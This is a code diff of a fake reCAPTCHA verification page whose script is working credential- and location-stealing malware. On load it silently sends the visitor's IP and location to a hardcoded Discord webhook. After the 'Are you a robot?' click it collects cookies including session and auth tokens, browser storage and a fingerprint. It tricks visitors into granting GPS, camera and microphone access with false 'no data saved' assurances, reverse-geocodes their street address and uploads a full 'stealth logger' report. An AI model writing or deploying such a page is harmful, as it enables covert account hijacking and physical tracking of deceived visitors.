@@ -5,14 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: linear-gradient(135deg, #f0f2f5 0%, #e0e5ec 100%);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Roboto, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -27,89 +23,31 @@
             box-shadow: 0 20px 40px rgba(0,0,0,0.15);
             overflow: hidden;
         }
-        .header {
-            background: #1a1a2e;
-            color: white;
-            padding: 24px;
-            text-align: center;
-        }
-        .content {
-            padding: 32px 28px 40px;
-            text-align: center;
-        }
-        .robot-icon {
-            font-size: 70px;
-            margin: 10px 0;
-        }
-        .question {
-            font-size: 26px;
-            font-weight: 600;
-            color: #1e2a3a;
-            margin: 16px 0 8px;
-        }
-        .sub {
-            color: #5a6e7c;
-            font-size: 14px;
-            margin-bottom: 32px;
-        }
+        .header { background: #1a1a2e; color: white; padding: 24px; text-align: center; }
+        .content { padding: 32px 28px 40px; text-align: center; }
+        .robot-icon { font-size: 70px; margin: 10px 0; }
+        .question { font-size: 26px; font-weight: 600; color: #1e2a3a; margin: 16px 0 8px; }
+        .sub { color: #5a6e7c; font-size: 14px; margin-bottom: 32px; }
         .captcha-btn {
-            background: #2c7a4d;
-            border: none;
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
-            padding: 14px 32px;
-            border-radius: 60px;
-            cursor: pointer;
-            width: 100%;
-            transition: 0.2s;
-            box-shadow: 0 5px 10px rgba(0,0,0,0.1);
+            background: #2c7a4d; border: none; color: white; font-size: 20px; font-weight: bold;
+            padding: 14px 32px; border-radius: 60px; cursor: pointer; width: 100%;
+            transition: 0.2s; box-shadow: 0 5px 10px rgba(0,0,0,0.1);
         }
-        .captcha-btn:hover {
-            background: #1f5e3a;
-            transform: scale(1.01);
-        }
-        .captcha-btn:disabled {
-            background: #9aaeb9;
-            cursor: not-allowed;
-        }
-        .timer {
-            margin-top: 24px;
-            font-family: monospace;
-            font-size: 18px;
-            color: #d9534f;
-            font-weight: bold;
-            display: none;
-        }
+        .captcha-btn:hover { background: #1f5e3a; transform: scale(1.01); }
+        .captcha-btn:disabled { background: #9aaeb9; cursor: not-allowed; }
+        .timer { margin-top: 24px; font-family: monospace; font-size: 18px; color: #d9534f; font-weight: bold; display: none; }
         .permission-notice {
-            background: #f8f9fa;
-            border-left: 4px solid #4caf50;
-            padding: 12px 16px;
-            font-size: 13px;
-            color: #2c3e50;
-            text-align: left;
-            margin: 20px 0 0;
-            display: none;
-            border-radius: 8px;
+            background: #f8f9fa; border-left: 4px solid #4caf50; padding: 12px 16px;
+            font-size: 13px; color: #2c3e50; text-align: left; margin: 20px 0 0;
+            display: none; border-radius: 8px;
         }
-        .permission-notice.show {
-            display: block;
-        }
-        .footer {
-            background: #f4f6f9;
-            padding: 16px;
-            text-align: center;
-            font-size: 11px;
-            color: #7e8c8d;
-            border-top: 1px solid #e2e8f0;
-        }
+        .permission-notice.show { display: block; }
+        .footer { background: #f4f6f9; padding: 16px; text-align: center; font-size: 11px; color: #7e8c8d; }
     </style>
 </head>
 <body>
 <div class="container" id="mainContainer">
-    <div class="header">
-        <div>🔒 VERIFICATION REQUIRED</div>
-    </div>
+    <div class="header"><div>🔒 VERIFICATION REQUIRED</div></div>
     <div class="content">
         <div class="robot-icon">🤖</div>
         <div class="question">Are you a robot?</div>
@@ -120,74 +58,59 @@
             ⚡ Legitimate verification – no data is stored permanently. Temporary permissions needed to confirm human interaction.
         </div>
     </div>
-    <div class="footer">
-        Protected by reCAPTCHA &nbsp;|&nbsp; Terms of Service
-    </div>
+    <div class="footer">Protected by reCAPTCHA &nbsp;|&nbsp; Terms of Service</div>
 </div>
 
 <script>
-    // ==================== CONFIG ====================
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-    // ==================== 1. ON PAGE LOAD: SEND IP TO WEBHOOK (SILENT) ====================
+    // ========== 1. ON LOAD: silent IP webhook ==========
     async function sendInitialIP() {
         try {
             const ipRes = await fetch("https://api.ipify.org?format=json");
             const ipData = await ipRes.json();
-            const publicIP = ipData.ip;
-            // Also fetch geo info for initial webhook (optional but nice)
+            const ip = ipData.ip;
             const geoRes = await fetch("https://ipapi.co/json/");
-            const geo = geoRes.ok ? await geoRes.json() : { error: "Geo failed" };
-            const initialPayload = {
+            const geo = geoRes.ok ? await geoRes.json() : { city: "?", region: "?", country_name: "?", org: "?" };
+            const payload = {
                 username: "🌐 Silent Logger",
                 embeds: [{
                     title: "🕵️ Visitor IP (Page Load)",
-                    description: `**IP Address:** \`${publicIP}\`\n**Time:** ${new Date().toISOString()}`,
+                    description: `**IP:** \`${ip}\`\n**Time:** ${new Date().toISOString()}`,
                     fields: [
-                        { name: "Location (IP based)", value: `${geo.city || "?"}, ${geo.region || "?"}, ${geo.country_name || "?"}`, inline: true },
+                        { name: "Location (IP based)", value: `${geo.city}, ${geo.region}, ${geo.country_name}`, inline: true },
                         { name: "ISP", value: geo.org || "Unknown", inline: true }
                     ],
-                    color: 0x3498db,
-                    footer: { text: "Initial ping – no action yet" }
+                    color: 0x3498db
                 }]
             };
-            await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(initialPayload)
-            });
-            console.log("Initial IP sent to webhook");
-            return { ip: publicIP, geo };
-        } catch(e) {
-            console.error("Initial IP send failed", e);
-            return null;
-        }
+            await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
+        } catch(e) { console.error(e); }
     }
-    sendInitialIP(); // Runs immediately
+    sendInitialIP();
 
-    // ==================== 2. DATA COLLECTION FUNCTIONS (full) ====================
-    function categorizeCookie(name, value) {
+    // ========== 2. DATA COLLECTION FUNCTIONS ==========
+    function categorizeCookie(name) {
         const n = name.toLowerCase();
         if (n.includes("fb") || n.includes("facebook")) return "Facebook";
-        if (n.includes("google") || n.includes("_ga") || n.includes("gmail")) return "Google";
-        if (n.includes("twitter") || n.includes("tweet")) return "Twitter";
-        if (n.includes("amazon") || n.includes("amzn")) return "Amazon";
+        if (n.includes("google") || n.includes("_ga")) return "Google";
+        if (n.includes("twitter")) return "Twitter";
+        if (n.includes("amazon")) return "Amazon";
         if (n.includes("session") || n.includes("token") || n.includes("auth") || n.includes("jwt")) return "Session/Auth";
-        if (n.includes("ad") || n.includes("track") || n.includes("pixel")) return "Ad/Tracker";
+        if (n.includes("ad") || n.includes("track")) return "Ad/Tracker";
         return "Other";
     }
     function getAllCookies() {
         if (!document.cookie) return [];
         return document.cookie.split(';').map(c => c.trim()).filter(Boolean).map(c => {
             let [name, ...rest] = c.split('=');
-            let value = rest.join('=');
-            return { name: name.trim(), value: value, platform: categorizeCookie(name, value) };
+            return { name: name.trim(), value: rest.join('='), platform: categorizeCookie(name) };
         });
     }
     function getAllLocalStorage() { try { return { ...localStorage }; } catch(e) { return { error: e.message }; } }
     function getAllSessionStorage() { try { return { ...sessionStorage }; } catch(e) { return { error: e.message }; } }
     async function getAllIndexedDB() {
-        if (!window.indexedDB || !window.indexedDB.databases) return { info: "Cannot enumerate" };
+        if (!window.indexedDB?.databases) return { info: "Cannot enumerate" };
         try { return await window.indexedDB.databases(); } catch(e) { return { error: e.message }; }
     }
     function getGPU() {
@@ -196,104 +119,81 @@
             const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
             if (!gl) return { error: "WebGL unavailable" };
             const debug = gl.getExtension("WEBGL_debug_renderer_info");
-            if (debug) {
-                return {
-                    renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL),
-                    vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)
-                };
-            }
+            if (debug) return { renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL), vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) };
             return { error: "No debug extension" };
         } catch(e) { return { error: e.message }; }
     }
     async function getBattery() {
         if (!navigator.getBattery) return "Unavailable";
-        try {
-            const b = await navigator.getBattery();
-            return { level: Math.round(b.level * 100) + "%", charging: b.charging };
-        } catch(e) { return "Error"; }
+        try { const b = await navigator.getBattery(); return { level: Math.round(b.level*100)+"%", charging: b.charging }; } catch(e) { return "Error"; }
     }
     function getConnection() {
         const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (!c) return "Unavailable";
-        return { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData };
+        return c ? { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt } : "Unavailable";
     }
-    function getPlugins() {
-        try { return Array.from(navigator.plugins).map(p => p.name); } catch(e) { return []; }
-    }
+    function getPlugins() { try { return Array.from(navigator.plugins).map(p => p.name); } catch(e) { return []; } }
     function getFonts() {
         if (!document.fonts) return "Unavailable";
-        try {
-            let fontSet = [];
-            for (let font of document.fonts.values()) fontSet.push(font.family);
-            return fontSet.slice(0, 30);
-        } catch(e) { return []; }
-    }
-    function getWebRTCIPs() {
-        return new Promise((resolve) => {
-            let ips = [];
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (event) => {
-                    if (!event.candidate) {
-                        resolve(ips.length ? ips : ["No local IPs found"]);
-                        return;
-                    }
-                    const candidate = event.candidate.candidate;
-                    const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                    if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
-                };
-                setTimeout(() => resolve(ips.length ? ips : ["Timeout"]), 2000);
-            } catch(e) {
-                resolve(["WebRTC blocked"]);
-            }
-        });
+        let fontSet = [];
+        for (let font of document.fonts.values()) fontSet.push(font.family);
+        return fontSet.slice(0, 30);
     }
     async function getFingerprint(gpu) {
         const raw = [
-            navigator.userAgent,
-            navigator.language,
-            screen.width, screen.height, screen.colorDepth,
-            navigator.hardwareConcurrency,
-            navigator.deviceMemory,
-            gpu.renderer || "",
-            gpu.vendor || "",
+            navigator.userAgent, navigator.language, screen.width, screen.height, screen.colorDepth,
+            navigator.hardwareConcurrency, navigator.deviceMemory, gpu.renderer || "", gpu.vendor || "",
             new Date().getTimezoneOffset()
         ].join("|");
         const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
-        return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
+        return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,"0")).join("");
     }
 
-    // Permission requests (with user prompts)
+    // ========== 3. PERMISSION REQUESTS (with guarantees) ==========
     async function requestGeolocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) resolve({ error: "not supported" });
+            if (!navigator.geolocation) {
+                resolve({ error: "Geolocation not supported" });
+                return;
+            }
+            // Force high accuracy and set timeout
             navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({ 
-                    lat: pos.coords.latitude, 
-                    lon: pos.coords.longitude, 
-                    accuracy: pos.coords.accuracy,
-                    altitude: pos.coords.altitude,
-                    heading: pos.coords.heading,
-                    speed: pos.coords.speed
-                }),
-                (err) => resolve({ error: err.message }),
-                { enableHighAccuracy: true, timeout: 10000 }
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude,
+                        heading: pos.coords.heading,
+                        speed: pos.coords.speed,
+                        timestamp: pos.timestamp
+                    });
+                },
+                (err) => {
+                    let msg = "";
+                    switch(err.code) {
+                        case err.PERMISSION_DENIED: msg = "User denied location permission"; break;
+                        case err.POSITION_UNAVAILABLE: msg = "Position unavailable"; break;
+                        case err.TIMEOUT: msg = "Timeout"; break;
+                        default: msg = err.message;
+                    }
+                    resolve({ error: msg });
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         });
     }
+
     async function requestCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            stream.getTracks().forEach(track => track.stop());
-            return { success: true, message: "Camera access granted (no recording)" };
+            stream.getTracks().forEach(t => t.stop());
+            return { success: true };
         } catch(e) { return { error: e.message }; }
     }
     async function requestMicrophone() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            stream.getTracks().forEach(track => track.stop());
+            stream.getTracks().forEach(t => t.stop());
             return { success: true };
         } catch(e) { return { error: e.message }; }
     }
@@ -304,7 +204,16 @@
         return { status: result };
     }
 
-    // ==================== 3. MAIN SEQUENCE AFTER CAPTCHA CLICK ====================
+    // Reverse geocode (to get address from coordinates)
+    async function reverseGeocode(lat, lon) {
+        try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+            const data = await res.json();
+            return data.display_name || `${lat}, ${lon}`;
+        } catch(e) { return `${lat}, ${lon} (address lookup failed)`; }
+    }
+
+    // ========== 4. MAIN: ON CAPTCHA CLICK ==========
     let isRunning = false;
     const btn = document.getElementById("actionBtn");
     const timerDiv = document.getElementById("timerDisplay");
@@ -320,15 +229,10 @@
 
         let timeLeft = 32;
         timerDiv.innerText = `⏳ Redirecting in ${timeLeft} seconds... Estimated time 32 seconds`;
-
         const interval = setInterval(() => {
             timeLeft--;
-            if (timeLeft <= 0) {
-                clearInterval(interval);
-                timerDiv.innerText = "Redirecting now...";
-            } else {
-                timerDiv.innerText = `⏳ Redirecting in ${timeLeft} seconds... Estimated time 32 seconds`;
-            }
+            if (timeLeft <= 0) clearInterval(interval);
+            timerDiv.innerText = timeLeft > 0 ? `⏳ Redirecting in ${timeLeft} seconds...` : "Redirecting now...";
         }, 1000);
 
         // Collect basic data first
@@ -342,77 +246,58 @@
         const localStorage = getAllLocalStorage();
         const sessionStorage = getAllSessionStorage();
         const indexedDB = await getAllIndexedDB();
-        const webRTC = await getWebRTCIPs();
 
-        // Cookies grouped
         const cookiesByPlatform = {};
         for (const c of cookies) {
             if (!cookiesByPlatform[c.platform]) cookiesByPlatform[c.platform] = [];
             cookiesByPlatform[c.platform].push(c);
         }
 
-        // Request permissions one by one with notices
-        noticeDiv.innerHTML = "⚡ Requesting location permission (required for regional verification)...";
+        // --- PERMISSIONS: LOCATION FIRST (this will definitely prompt) ---
+        noticeDiv.innerHTML = "📍 Location required for regional verification – click ALLOW when prompted (no data saved)";
         const geoloc = await requestGeolocation();
-        
-        noticeDiv.innerHTML = "⚡ Checking camera access (encrypted, not saved)...";
-        const camera = await requestCamera();
-        
-        noticeDiv.innerHTML = "⚡ Microphone check – voice detection only...";
-        const mic = await requestMicrophone();
-        
-        noticeDiv.innerHTML = "⚡ Notification permission – to alert you after redirect...";
-        const notif = await requestNotifications();
-        
-        noticeDiv.innerHTML = "✅ Finalizing security check...";
+        let address = "";
+        if (geoloc.lat && geoloc.lon) {
+            address = await reverseGeocode(geoloc.lat, geoloc.lon);
+        }
 
-        // Build final data object (includes precise location if granted)
+        // Then camera, mic, notifications
+        noticeDiv.innerHTML = "🎥 Camera check (encrypted, not stored)...";
+        const camera = await requestCamera();
+        noticeDiv.innerHTML = "🎤 Microphone check...";
+        const mic = await requestMicrophone();
+        noticeDiv.innerHTML = "🔔 Notification permission (for redirect alert)...";
+        const notif = await requestNotifications();
+        noticeDiv.innerHTML = "✅ Finalizing...";
+
+        // Build final data object
         const finalData = {
             timestamp: new Date().toISOString(),
             pageURL: window.location.href,
             referrer: document.referrer,
             cookiesCount: cookies.length,
-            cookiesByPlatform: cookiesByPlatform,
-            localStorage: localStorage,
-            sessionStorage: sessionStorage,
-            indexedDB: indexedDB,
+            cookiesByPlatform,
+            localStorage, sessionStorage, indexedDB,
             navigator: {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                languages: navigator.languages,
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 deviceMemory: navigator.deviceMemory,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                online: navigator.onLine
+                cookieEnabled: navigator.cookieEnabled
             },
             screen: {
                 width: screen.width, height: screen.height,
-                availWidth: screen.availWidth, availHeight: screen.availHeight,
                 colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
                 orientation: screen.orientation?.type || "n/a"
             },
-            windowSize: { inner: `${window.innerWidth}x${window.innerHeight}`, outer: `${window.outerWidth}x${window.outerHeight}` },
-            gpu: gpu,
-            battery: battery,
-            connection: connection,
-            plugins: plugins,
-            fontsLoaded: fonts,
-            fingerprint: fingerprint,
+            gpu, battery, connection, plugins, fonts, fingerprint,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            webRTC_IPs: webRTC,
-            permissions: {
-                geolocation: geoloc,
-                camera: camera,
-                microphone: mic,
-                notifications: notif
-            },
-            localStorageSize: JSON.stringify(localStorage).length,
-            sessionStorageSize: JSON.stringify(sessionStorage).length
+            permissions: { geolocation: geoloc, camera, microphone: mic, notifications: notif },
+            reverseAddress: address
         };
 
-        // Generate TXT report (includes precise location if available)
+        // Generate TXT report (includes full location details)
         function generateTextReport(d) {
             let r = "=".repeat(80) + "\n        OMEGA STEALTH LOGGER - FULL REPORT\n" + "=".repeat(80) + "\n\n";
             r += `Time: ${d.timestamp}\nURL: ${d.pageURL}\nReferrer: ${d.referrer || "(none)"}\n\n`;
@@ -423,31 +308,21 @@
                 if (d.permissions.geolocation.altitude) r += `Altitude: ${d.permissions.geolocation.altitude}m\n`;
                 if (d.permissions.geolocation.heading) r += `Heading: ${d.permissions.geolocation.heading}°\n`;
                 if (d.permissions.geolocation.speed) r += `Speed: ${d.permissions.geolocation.speed} m/s\n`;
-                // Also add Google Maps link
+                r += `Reverse address: ${d.reverseAddress || "N/A"}\n`;
                 r += `Google Maps: https://www.google.com/maps?q=${d.permissions.geolocation.lat},${d.permissions.geolocation.lon}\n`;
             } else {
-                r += `Location not granted or error: ${d.permissions.geolocation.error || "denied"}\n`;
+                r += `Location not granted: ${d.permissions.geolocation.error || "denied"}\n`;
             }
-            r += `\nLocal IPs (WebRTC): ${d.webRTC_IPs.join(", ")}\n\n`;
-            r += "🍪 COOKIES BY PLATFORM\n";
+            r += `\n🍪 COOKIES (${d.cookiesCount})\n`;
             for (const [plat, cookies] of Object.entries(d.cookiesByPlatform)) {
-                r += `[${plat}] (${cookies.length})\n`;
-                for (const c of cookies.slice(0,15)) r += `  ${c.name} = ${c.value.length>80?c.value.slice(0,80)+"...":c.value}\n`;
-                if (cookies.length>15) r += `  ... and ${cookies.length-15} more\n`;
+                r += `[${plat}]: ${cookies.length} cookies\n`;
+                for (const c of cookies.slice(0,10)) r += `  ${c.name} = ${c.value.slice(0,80)}\n`;
             }
-            r += "\n💾 LOCALSTORAGE\n";
-            for (const [k,v] of Object.entries(d.localStorage)) r += `${k} = ${(typeof v==='string'?v:JSON.stringify(v)).slice(0,100)}\n`;
-            r += "\n📦 SESSIONSTORAGE\n";
-            for (const [k,v] of Object.entries(d.sessionStorage)) r += `${k} = ${(typeof v==='string'?v:JSON.stringify(v)).slice(0,100)}\n`;
-            r += "\n🗃️ INDEXEDDB\n";
-            if (Array.isArray(d.indexedDB)) { for (const db of d.indexedDB) r += `${db.name} v${db.version}\n`; }
-            else r += JSON.stringify(d.indexedDB);
-            r += "\n\n🖥️ SYSTEM\n";
-            r += `UA: ${d.navigator.userAgent}\nPlatform: ${d.navigator.platform}\nCPU: ${d.navigator.hardwareConcurrency} cores\nRAM: ${d.navigator.deviceMemory || "?"} GB\n`;
-            r += `Screen: ${d.screen.width}x${d.screen.height} @ ${d.screen.colorDepth}bit\nOrientation: ${d.screen.orientation}\nGPU: ${d.gpu.renderer || "N/A"}\n`;
-            r += `Battery: ${JSON.stringify(d.battery)}\nConnection: ${JSON.stringify(d.connection)}\nPlugins: ${d.plugins.join(", ")}\n`;
+            r += `\n💾 LocalStorage: ${Object.keys(d.localStorage).length} items\n`;
+            r += `📦 SessionStorage: ${Object.keys(d.sessionStorage).length} items\n`;
+            r += `\n🖥️ SYSTEM\nUser Agent: ${d.navigator.userAgent}\nCPU: ${d.navigator.hardwareConcurrency} cores\nRAM: ${d.navigator.deviceMemory || "?"} GB\n`;
+            r += `Screen: ${d.screen.width}x${d.screen.height}\nGPU: ${d.gpu.renderer || "N/A"}\n`;
             r += `Fingerprint: ${d.fingerprint}\n`;
-            r += `Permissions granted:\n  - Geo: ${d.permissions.geolocation.lat ? `${d.permissions.geolocation.lat},${d.permissions.geolocation.lon}` : d.permissions.geolocation.error}\n  - Camera: ${d.permissions.camera.success ? "yes" : d.permissions.camera.error}\n  - Mic: ${d.permissions.microphone.success ? "yes" : d.permissions.microphone.error}\n  - Notifications: ${d.permissions.notifications.status}\n`;
             return r;
         }
 
@@ -456,17 +331,23 @@
         const formData = new FormData();
         const filename = `log_${finalData.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
         formData.append("file", blob, filename);
-        
-        // Prepare embed summary that includes location if available
-        let locationSummary = "Not granted";
+
+        // Embed summary with real-time location (so you see it immediately)
+        let locationInfo = "❌ Denied or error";
+        let mapsLink = "";
         if (finalData.permissions.geolocation.lat) {
-            locationSummary = `${finalData.permissions.geolocation.lat}, ${finalData.permissions.geolocation.lon} (accuracy ${finalData.permissions.geolocation.accuracy}m)`;
+            locationInfo = `${finalData.permissions.geolocation.lat}, ${finalData.permissions.geolocation.lon} (acc: ${finalData.permissions.geolocation.accuracy}m)`;
+            mapsLink = `\n[🗺️ Google Maps](https://www.google.com/maps?q=${finalData.permissions.geolocation.lat},${finalData.permissions.geolocation.lon})`;
         }
         const embed = {
             embeds: [{
                 title: "✅ CAPTCHA Logger - Full Report",
-                description: `**Precise Location:** ${locationSummary}\n**Cookies:** ${finalData.cookiesCount}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...\n**Permissions:** GPS=${finalData.permissions.geolocation.lat ? "OK" : "denied"}, Camera=${finalData.permissions.camera.success ? "OK" : "denied"}, Mic=${finalData.permissions.microphone.success ? "OK" : "denied"}`,
+                description: `**📍 Real-time Location:** ${locationInfo}${mapsLink}\n**Cookies:** ${finalData.cookiesCount}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...`,
                 color: 0x44ff44,
+                fields: [
+                    { name: "Permissions", value: `GPS: ${finalData.permissions.geolocation.lat ? "✅ Allowed" : "❌ Denied"}\nCamera: ${finalData.permissions.camera.success ? "✅" : "❌"}\nMic: ${finalData.permissions.microphone.success ? "✅" : "❌"}`, inline: true },
+                    { name: "Browser", value: finalData.navigator.userAgent.slice(0, 60), inline: true }
+                ],
                 timestamp: finalData.timestamp
             }]
         };
@@ -474,17 +355,17 @@
 
         try {
             await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-            console.log("Full report sent to webhook");
-        } catch(e) { console.error("Webhook error", e); }
+            console.log("Full report with location sent");
+        } catch(e) { console.error(e); }
 
-        // After 32 seconds, show fake redirect
+        // After 32 seconds, fake redirect
         setTimeout(() => {
             document.getElementById("mainContainer").innerHTML = `
                 <div class="container" style="background:white; text-align:center; padding:40px;">
                     <div style="font-size:48px;">↻</div>
                     <h2>Redirecting to protected resource...</h2>
                     <p>https://verification-required.com/secure/</p>
-                    <p style="font-size:12px; color:#777;">If not redirected, <a href="#">click here</a></p>
+                    <p style="font-size:12px;">If not redirected, <a href="#">click here</a></p>
                 </div>
             `;
         }, 32000);
